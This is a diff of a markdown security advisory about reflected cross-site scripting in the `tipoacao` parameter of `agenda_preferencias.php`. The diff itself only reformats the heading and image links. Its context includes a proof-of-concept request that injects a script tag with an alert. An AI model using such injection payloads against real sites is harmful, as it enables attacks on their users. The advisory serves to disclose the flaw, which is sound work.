@@ -1,4 +1,4 @@
-Cross-Site Scripting (XSS) Reflected endpoint `agenda_preferencias.php` parameter `tipoacao`
+# Cross-Site Scripting (XSS) Reflected endpoint `agenda_preferencias.php` parameter `tipoacao`
 
 ---
 
@@ -52,10 +52,12 @@ Priority: u=0, i
 tipoacao=Editar"><script>alert('XSS-PoC')</script>&cod_agenda=2&envia_alerta=0&agenda_display=2
 ```
 
-![[Pasted image 20250816233021.png]]
+<img width="840" height="583" alt="Pasted image 20250816233021" src="https://github.com/user-attachments/assets/b312f674-be8a-4f2d-8370-375b0a3f6708" />
+
 
 The result:
-![[Pasted image 20250816233448.png]]
+<img width="736" height="565" alt="Pasted image 20250816233448" src="https://github.com/user-attachments/assets/0c46fe97-a273-4c6f-9840-39f3e2babd73" />
+
 
 
 ---
